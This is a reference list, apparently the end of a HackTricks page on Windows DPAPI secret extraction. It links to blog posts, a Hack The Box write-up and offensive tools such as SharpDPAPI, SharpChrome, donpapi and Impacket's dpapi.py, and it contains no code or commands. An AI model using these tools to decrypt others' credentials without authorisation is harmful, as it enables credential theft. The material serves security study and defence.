- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
